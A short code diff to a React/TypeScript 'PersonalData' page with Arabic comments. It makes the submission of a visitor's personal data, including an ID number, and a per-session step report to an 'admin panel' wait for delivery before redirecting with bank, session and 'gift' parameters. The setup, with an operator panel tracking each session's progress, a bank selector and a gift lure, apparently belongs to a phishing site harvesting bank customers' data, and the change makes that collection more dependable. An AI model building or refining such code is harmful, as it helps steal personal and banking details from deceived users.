@@ -137,16 +137,21 @@ export default function PersonalData() {
         idNumber: "",
       };
 
-      // إرسال البيانات في الخلفية
-      submitPersonalDataMutation.mutate(submissionPayload);
-      
-      // إبلاغ لوحة الإدارة بالانتقال للمرحلة التالية في الخلفية
-      reportStepMutation.mutate({
-        sessionId: currentSessionId,
-        step: "registration-completion"
-      });
+      // إرسال البيانات وانتظارها لضمان وصولها للوحة الإدارة
+      try {
+        await submitPersonalDataMutation.mutateAsync(submissionPayload);
+        
+        // إبلاغ لوحة الإدارة بالانتقال للمرحلة التالية
+        await reportStepMutation.mutateAsync({
+          sessionId: currentSessionId,
+          step: "registration-completion"
+        });
 
-      console.log("Data submission initiated, redirecting...");
+        console.log("Data submission successful, redirecting...");
+      } catch (mutateError) {
+        console.error("Mutation failed but continuing for user flow:", mutateError);
+      }
+
       const giftId = params.get("gift") || "";
       setLocation(`/registration-completion?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
     } catch (error: any) {
